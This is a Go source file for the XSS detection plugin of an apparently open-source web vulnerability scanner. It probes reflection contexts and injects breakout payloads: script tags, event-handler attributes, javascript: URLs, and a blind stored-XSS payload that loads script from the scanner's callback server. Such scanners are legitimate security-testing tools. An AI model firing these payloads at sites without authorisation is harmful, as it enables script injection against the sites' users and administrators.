/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package xss

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	"wscan/core/utils"
	"wscan/core/utils/checker"
	logger "wscan/core/utils/log"

	"github.com/PuerkitoBio/goquery"
	"golang.org/x/net/html"
)

type Element struct {
	node       *html.Node
	name       string
	attributes map[string]string
	text       string
}

type Config struct {
	base.PluginBaseConfig `json:",inline" yaml:",inline"`
	DetectXSSInCookie     bool `json:"detect_xss_in_cookie" yaml:"detect_xss_in_cookie" #:"是否探测入口点在 cookie 中的 xss"`
	DetectXSSInReferer    bool `json:"detect_xss_in_referer" yaml:"detect_xss_in_referer" #:"是否探测入口点在 referer 中的 xss"`
	IEFeature             bool `json:"ie_feature" yaml:"ie_feature" #:"是否扫描仅能在 ie 下利用的 xss"`
	DetectBlindXSS        bool `json:"detect_blind_xss" yaml:"detect_blind_xss" #:"是否启用盲打 XSS（存储型/二阶 XSS）检测，需要反连平台支持"`
}

func (c *Config) BaseConfig() *base.PluginBaseConfig {
	return &c.PluginBaseConfig
}

type XSS struct {
	base.PluginMixinInitConfig
	base.PluginMixinClose
	Client             *http.Client
	bfBase             *base.Apollo
	cookieDomainFilter *checker.URLChecker
	refererFilter      *checker.URLChecker
}

func (p *XSS) AddXSSVuln(context.Context, *http.Request, *http.Response, *http.Parameter, string) {
}

type Occurrence struct {
	Type     string
	Position int
	Details  map[string]any
}

// D1-17: SearchInputInResponse 精确匹配优化
// 使用 == 精确匹配标签名，而非 strings.Contains
// 属性值使用精确匹配替代 strings.Contains
func SearchInputInResponse(input, body string) []Occurrence {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(body))
	if err != nil {
		fmt.Println("Error parsing HTML:", err)
		return nil
	}

	var occurrences []Occurrence
	doc.Find("*").Each(func(index int, selection *goquery.Selection) {
		tagName := selection.Nodes[0].Data
		content := selection.Text()
		attributes := make(map[string]string)
		selection.Each(func(i int, s *goquery.Selection) {
			for _, attr := range s.Nodes[0].Attr {
				attributes[attr.Key] = attr.Val
			}
		})

		// D1-17: 使用 == 精确匹配标签名替代 strings.Contains
		if tagName == input {
			occurrences = append(occurrences, Occurrence{
				Type:     "intag",
				Position: index,
				Details: map[string]any{
					"tagname":    tagName,
					"content":    content,
					"attributes": attributes,
				},
			})
		} else if strings.Contains(content, input) {
			switch tagName {
			case "#comment":
				occurrences = append(occurrences, Occurrence{
					Type:     "comment",
					Position: index,
					Details: map[string]any{
						"tagname":    tagName,
						"content":    content,
						"attributes": attributes,
					},
				})
			case "script":
				occurrences = append(occurrences, Occurrence{
					Type:     "script",
					Position: index,
					Details: map[string]any{
						"tagname":    tagName,
						"content":    content,
						"attributes": attributes,
					},
				})
			case "style":
				occurrences = append(occurrences, Occurrence{
					Type:     "html",
					Position: index,
					Details: map[string]any{
						"tagname":    tagName,
						"content":    content,
						"attributes": attributes,
					},
				})
			default:
				occurrences = append(occurrences, Occurrence{
					Type:     "html",
					Position: index,
					Details: map[string]any{
						"tagname":    tagName,
						"content":    content,
						"attributes": attributes,
					},
				})
			}
		} else {
			for k, v := range attributes {
				// D1-17: 属性名和属性值使用精确匹配替代 strings.Contains
				if k == input {
					occurrences = append(occurrences, Occurrence{
						Type:     "attribute",
						Position: index,
						Details: map[string]any{
							"tagname":    tagName,
							"content":    "key",
							"attributes": map[string]string{k: v},
						},
					})
				} else if v == input {
					occurrences = append(occurrences, Occurrence{
						Type:     "attribute",
						Position: index,
						Details: map[string]any{
							"tagname":    tagName,
							"content":    "value",
							"attributes": map[string]string{k: v},
						},
					})
				}
			}
		}
	})

	return occurrences
}

func (p *XSS) Fingers() []*base.Finger {
	fingers := []*base.Finger{}
	// 主 XSS 检测（Query/Body 参数注入）
	fingers = append(fingers, &base.Finger{
		CheckAction: func(ctx context.Context, bi *base.Apollo) error {
			flow := bi.GetTargetFlow()
			logger.Debugf("Start detection XSS, URL=%s", flow.Request.URL().String())
			for _, param := range flow.Request.ParamsAll() {
				if param.Position == http.PositionHeader {
					if p.GetConfig().(*Config).DetectXSSInReferer == false {
						if param.Key == "referer" {
							continue
						}
					}
				}
				if param.Position == http.PositionCookie {
					if p.GetConfig().(*Config).DetectXSSInCookie == false {
						continue
					}
				}
				// D1-15: 使用更广泛的随机字符集（大小写+数字）替代纯小写
				xssPayload := utils.RandomStr(utils.AsciiLettersAndDigits, 8)
				req := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: xssPayload, Suffix: ""})
				res, err := bi.HTTPClient.Respond(ctx, req)
				if err != nil {
					continue
				}
				contentType := strings.ToLower(res.GetContentType())
				if !strings.Contains(contentType, "html") {
					continue
				}
				locations := SearchInputInResponse(xssPayload, res.Text)
				if len(locations) == 0 {
					continue
				}
				// TODO(PostScan): Record reflection point for stored XSS verification.
				// After detecting a reflected XSS, record the reflection so the PostScan
				// phase can re-visit this URL to check if the payload persisted:
				//   bi.ApolloBase.RecordReflection(&base.ReflectionRecord{
				//       URL:        flow.Request.URL().String(),
				//       Method:     flow.Request.Method,
				//       Parameter:  param.Key,
				//       Payload:    xssPayload,
				//       PluginName: "xss",
				//       VulnType:   "xss",
				//       Timestamp:  time.Now(),
				//   })
				location := locations[len(locations)-1]
				logger.Infof("%s 通过AST分析发现潜在的注入点可能位于 %s 类型 %s", flow.Request.URL().String(), location.Details["tagname"], location.Type)
				if location.Type == "html" {
					if location.Details["tagname"] == "style" {
						// style 标签 XSS：通过 CSS expression 或 import 注入
						flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
						payload := fmt.Sprintf("}%s{background:url(//%s)", flag, flag)
						astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
						astRes, err := bi.HTTPClient.Respond(ctx, astReq)
						if err != nil {
							continue
						}
						if strings.Contains(astRes.Text, flag) {
							v := bi.NewWebVuln(req, res, &param)
							if v != nil {
								v.SetTargetURL(flow.Request.URL())
								v.Payload = "}body{background:url('javascript:alert(1)')}"
								v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: "}body{background:url('javascript:alert(1)')", Suffix: ""}
								bi.OutputVuln(v)
							}
						}
					} else {
						tagname := location.Details["tagname"]
						if tagname == "" {
							logger.Error("tagName is empty")
							continue
						}
						flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
						payload := fmt.Sprintf("</%s><%s>", tagname, flag)
						astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
						astRes, err := bi.HTTPClient.Respond(ctx, astReq)
						if err != nil {
							continue
						}
						_locations := SearchInputInResponse(flag, astRes.Text)
						for _, location := range _locations {
							if location.Details["tagname"] == flag {
								v := bi.NewWebVuln(req, res, &param)
								if v != nil {
									v.SetTargetURL(flow.Request.URL())
									v.Payload = "<sCrIpT>alert(1)</ScRiPt>"
									v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: "<sCrIpT>alert(1)</ScRiPt>", Suffix: ""}
									bi.OutputVuln(v)
								}
							}
						}

						break
					}
				} else if location.Type == "attribute" {
					if location.Details["content"] == "key" {
						flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
						payload := fmt.Sprintf("><%s ", flag)
						truePayload := "><svg onload=alert`1`>"
						astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
						astRes, err := bi.HTTPClient.Respond(ctx, astReq)
						if err != nil {
							continue
						}
						_locations := SearchInputInResponse(flag, astRes.Text)
						for _, location := range _locations {
							if location.Details["tagname"] == flag {
								v := bi.NewWebVuln(req, res, &param)
								if v != nil {
									v.SetTargetURL(flow.Request.URL())
									v.Payload = truePayload
									v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: truePayload, Suffix: ""}
									bi.OutputVuln(v)
									break
								}
							}
						}

					} else {
						// D1-15: 检查是否为 href/src 属性，增加 javascript: 协议注入检测
						attrKey := ""
						if attrs, ok := location.Details["attributes"]; ok {
							for k := range attrs.(map[string]string) {
								attrKey = k
								break
							}
						}

						// D1-15: javascript: 协议注入检测
						if attrKey == "href" || attrKey == "src" || attrKey == "action" || attrKey == "formaction" {
							jsPayload := "javascript:alert(1)"
							jsReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: jsPayload, Suffix: ""})
							jsRes, err := bi.HTTPClient.Respond(ctx, jsReq)
							if err == nil {
								// 检查响应中是否包含 javascript:alert(1)
								jsLocations := SearchInputInResponse("javascript", jsRes.Text)
								for _, jsLoc := range jsLocations {
									if jsLoc.Type == "attribute" {
										if attrs, ok := jsLoc.Details["attributes"]; ok {
											for _, v := range attrs.(map[string]string) {
												if strings.HasPrefix(strings.ToLower(v), "javascript:") {
													vuln := bi.NewWebVuln(jsReq, jsRes, &param)
													if vuln != nil {
														vuln.SetTargetURL(flow.Request.URL())
														vuln.Payload = "javascript:alert(1)"
														vuln.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: "javascript:alert(1)", Suffix: ""}
														bi.OutputVuln(vuln)
													}
													break
												}
											}
										}
									}
								}
							}
						}

						// 通用属性值注入检测
						payloads := []string{"'", "\"", " "}
						flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
					outerLoop:
						for _, p := range payloads {
							payload := fmt.Sprintf("%s%s=%s%s", p, flag, p, p)
							truePayload := fmt.Sprintf("%s onmouseover=prompt(1) %s", p, p)
							astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
							astRes, err := bi.HTTPClient.Respond(ctx, astReq)
							if err != nil {
								continue
							}
							if p != " " {
								escapedPayload := fmt.Sprintf("\\%s%s=\\%s\\%s", p, flag, p, p)
								if strings.Contains(astRes.Text, escapedPayload) {
									logger.Infof("扫描目标会对我们的XSS Payload进行转义，%s", escapedPayload)
									break
								}
							}

							_locations := SearchInputInResponse(flag, astRes.Text)
							for _, location := range _locations {
								if attributes, ok := location.Details["attributes"]; ok {
									for k := range attributes.(map[string]string) {
										if k == flag {
											v := bi.NewWebVuln(req, res, &param)
											if v != nil {
												v.SetTargetURL(flow.Request.URL())
												v.Payload = truePayload
												v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: truePayload, Suffix: ""}
												bi.OutputVuln(v)
												break outerLoop
											}
										}
									}
								}
							}
						}
					}
				} else if location.Type == "script" {
					tagName := location.Details["tagname"]
					if tagName == "" {
						logger.Error("tagName is empty")
						continue
					}

					// D1-15: JS 字符串上下文检测
					// 测试单引号闭合: '+alert(1)+'
					jsFlag1 := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
					jsStrPayload1 := fmt.Sprintf("'+alert(1)+'%s", jsFlag1)
					jsReq1 := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: jsStrPayload1, Suffix: ""})
					jsRes1, err := bi.HTTPClient.Respond(ctx, jsReq1)
					if err == nil && jsRes1 != nil {
						jsLocs1 := SearchInputInResponse(jsFlag1, jsRes1.Text)
						for _, jsLoc := range jsLocs1 {
							if jsLoc.Type == "script" || jsLoc.Type == "html" {
								v := bi.NewWebVuln(jsReq1, jsRes1, &param)
								if v != nil {
									v.SetTargetURL(flow.Request.URL())
									v.Payload = `'+alert(1)+'`
									v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: `'+alert(1)+'`, Suffix: ""}
									bi.OutputVuln(v)
								}
								break
							}
						}
					}

					// D1-15: 测试双引号闭合: ";alert(1);//
					jsFlag2 := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
					jsStrPayload2 := fmt.Sprintf(`";alert(1);//%s`, jsFlag2)
					jsReq2 := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: jsStrPayload2, Suffix: ""})
					jsRes2, err := bi.HTTPClient.Respond(ctx, jsReq2)
					if err == nil && jsRes2 != nil {
						jsLocs2 := SearchInputInResponse(jsFlag2, jsRes2.Text)
						for _, jsLoc := range jsLocs2 {
							if jsLoc.Type == "script" || jsLoc.Type == "html" {
								v := bi.NewWebVuln(jsReq2, jsRes2, &param)
								if v != nil {
									v.SetTargetURL(flow.Request.URL())
									v.Payload = `";alert(1);//`
									v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: `";alert(1);//`, Suffix: ""}
									bi.OutputVuln(v)
								}
								break
							}
						}
					}

					// 原有的 script 标签闭合检测
					flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
					tagNameStr := utils.RandomUpper(tagName.(string))
					payload := fmt.Sprintf("</%s><%s>%s</%s>", tagNameStr,
						tagNameStr, flag,
						tagNameStr)
					truePayload := fmt.Sprintf("</%s><%s>%s</%s>", tagNameStr,
						tagNameStr, "prompt(1)",
						tagNameStr)
					astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
					astRes, err := bi.HTTPClient.Respond(ctx, astReq)
					if err != nil {
						continue
					}
					_locations := SearchInputInResponse(flag, astRes.Text)
					for _, location := range _locations {
						if location.Details["content"] == flag && strings.ToLower(location.Details["tagname"].(string)) == strings.ToLower(tagNameStr) {
							v := bi.NewWebVuln(req, res, &param)
							if v != nil {
								v.SetTargetURL(flow.Request.URL())
								v.Payload = truePayload
								v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: truePayload, Suffix: ""}
								bi.OutputVuln(v)
							}
						}
					}

					break
				} else if location.Type == "comment" {
					// HTML 注释中注入：闭合注释后注入新标签
					flag := utils.RandomStr(utils.AsciiLettersAndDigits, 6)
					payload := fmt.Sprintf("--><%s>", flag)
					astReq := flow.Request.Mutate(&http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: payload, Suffix: ""})
					astRes, err := bi.HTTPClient.Respond(ctx, astReq)
					if err != nil {
						continue
					}
					_locations := SearchInputInResponse(flag, astRes.Text)
					for _, loc := range _locations {
						if loc.Details["tagname"] == flag {
							v := bi.NewWebVuln(req, res, &param)
							if v != nil {
								v.SetTargetURL(flow.Request.URL())
								v.Payload = "--><sCrIpT>alert(1)</ScRiPt>"
								v.Param = &http.Parameter{Position: param.Position, Key: param.Key, Prefix: "", Value: "--><sCrIpT>alert(1)</ScRiPt>", Suffix: ""}
								bi.OutputVuln(v)
							}
							break
						}
					}
				}
			}
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{ID: "xss/reflected/default", Plugin: "xss/reflected", Category: "xss", Severity: model.SeverityHigh},
	})

	// 根据配置注册 Cookie 和 Referer 检测
	cfg, ok := p.GetConfig().(*Config)
	if ok && cfg != nil {
		if cfg.DetectXSSInCookie {
			fingers = append(fingers, (&cookieXSS{filter: p.cookieDomainFilter}).Finger())
		}
		if cfg.DetectXSSInReferer {
			fingers = append(fingers, (&refererXSS{filter: p.refererFilter}).Finger())
		}
		if cfg.IEFeature {
			fingers = append(fingers, (&ieFeatureXSS{}).Finger())
		}
		// 盲打 XSS 检测：仅在配置启用且反连平台可用时注册
		if cfg.DetectBlindXSS {
			fingers = append(fingers, p.blindXSSFinger())
		}
	}

	return fingers
}
func (p *XSS) checkContentCheatHeader() {
}

// blindXSSFinger 返回盲打 XSS 检测的 Finger
// 盲打 XSS 原理：在输入点注入闭合多种 HTML 上下文的 payload，
// payload 指向反连平台 URL，当后台管理员查看包含 payload 的数据时，
// XSS 被触发，反连平台收到回调，从而检测到存储型/二阶 XSS
func (p *XSS) blindXSSFinger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, bi *base.Apollo) error {
			// 盲打 XSS 需要反连平台可用
			if bi.Reverse == nil {
				logger.Debugf("Blind XSS skipped: reverse platform not available")
				return nil
			}

			flow := bi.GetTargetFlow()
			logger.Debugf("Start blind XSS detection, URL=%s", flow.Request.URL().String())

			for _, param := range flow.Request.ParamsAll() {
				// 跳过 Header 和 Cookie 参数，盲打 XSS 主要关注 Query/Body 参数
				if param.Position == http.PositionHeader || param.Position == http.PositionCookie {
					continue
				}

				// 在反连平台上注册一个回调槽位
				unit := bi.Reverse.Register(nil)
				visitURL := unit.GetVisitURL()

				// 构造盲打 XSS payload
				// 参考AWVS: 先闭合所有可能的HTML容器标签，再注入script标签指向反连平台
				// visitURL 格式: http://{addr}/i/{hashed_token}/{group_id}/{unit_id}/
				// 使用 protocol-relative URL (//) 使 payload 同时适用于 HTTP 和 HTTPS 页面
				blindPayload := fmt.Sprintf(
					`'"></title></style></textarea></noscript></template></script><script/src="%s"></script>`,
					visitURL,
				)

				// 注入 payload 并发送请求
				req := flow.Request.Mutate(&http.Parameter{
					Position: param.Position,
					Key:      param.Key,
					Prefix:   "",
					Value:    blindPayload,
					Suffix:   "",
				})
				res, err := bi.HTTPClient.Respond(ctx, req)
				if err != nil {
					logger.Debugf("Blind XSS request failed for param %s: %v", param.Key, err)
					continue
				}

				// 盲打 XSS 不需要立即验证结果
				// 当后台管理员查看包含 payload 的数据时，XSS 触发，反连平台收到回调
				// 通过 OnVisit 注册回调处理函数，在收到反连平台回调时报告漏洞
				capturedBi := bi
				capturedReq := req
				capturedRes := res
				capturedParam := param
				capturedPayload := blindPayload
				capturedFlow := flow
				capturedUnit := unit

				capturedUnit.OnVisit(func(event *reverse.Event) error {
					logger.Infof("Blind XSS callback received from %s for URL %s param %s",
						event.RemoteAddr, capturedFlow.Request.URL().String(), capturedParam.Key)

					v := capturedBi.NewWebVuln(capturedReq, capturedRes, &capturedParam)
					if v != nil {
						v.SetTargetURL(capturedFlow.Request.URL())
						v.Payload = capturedPayload
						v.Param = &http.Parameter{
							Position: capturedParam.Position,
							Key:      capturedParam.Key,
							Prefix:   "",
							Value:    capturedPayload,
							Suffix:   "",
						}
						// 在 Extra 中记录回调来源信息
						v.Add("blind_xss_callback_source", event.RemoteAddr)
						v.Add("blind_xss_event_type", event.EventType)
						capturedBi.OutputVuln(v)
					}
					return nil
				})

				// Fetch(0) 表示异步等待回调，不阻塞当前扫描
				capturedUnit.Fetch(0)
			}
			return nil
		},
		Channel:     "web-generic",
		NeedReverse: true,
		Binding:     &model.VulnBinding{ID: "blind_xss", Plugin: "xss/blind", Category: "xss", Severity: model.SeverityHigh},
	}
}

func (p *XSS) checkContentType() {
}
func (p *XSS) checkVulnerability() {
}

func (p *XSS) execAction(context.Context, *base.Apollo) error {
	return nil
}

func (p *XSS) requestForQuery() {
}
func (p *XSS) walkAParameter() {
}

func (p *XSS) Close() error {
	return nil
}

func (p *XSS) DefaultConfig() base.PluginConfigInterface {
	config := &Config{PluginBaseConfig: base.PluginBaseConfig{
		Name:    "xss",
		Enabled: true,
	}, DetectXSSInCookie: true, DetectXSSInReferer: true, IEFeature: true, DetectBlindXSS: true}
	return config
}

func (p *XSS) GetConfig() base.PluginConfigInterface {
	return p.PluginMixinInitConfig.GetConfig()
}

func (p *XSS) Scan() func(context.Context) error {
	return nil
}

// D1-16: 恢复 Init() filter 初始化
// 依赖 D2-01 Apollo 基础方法修复，如果 NewURLChecker 尚未实现则跳过
func (p *XSS) Init(ctx context.Context, pfi base.PluginConfigInterface, bb *base.ApolloBase) error {
	logger.Debug("XSS Plugin init")
	p.PluginMixinInitConfig.Init(ctx, pfi, bb)
	// D1-16: 恢复 filter 初始化代码
	// 尝试初始化 URLChecker，如果方法不存在则跳过（优雅降级）
	cfg, ok := pfi.(*Config)
	if ok && cfg != nil {
		uc, err := bb.NewURLChecker()
		if err == nil && uc != nil {
			//if cfg.DetectXSSInCookie {
			//	p.cookieDomainFilter = uc
			//}
			//if cfg.DetectXSSInReferer {
			//	p.refererFilter = uc
			//}
		} else {
			logger.Debugf("URLChecker not available, Cookie/Referer XSS domain filtering disabled")
		}
	}
	return nil
}
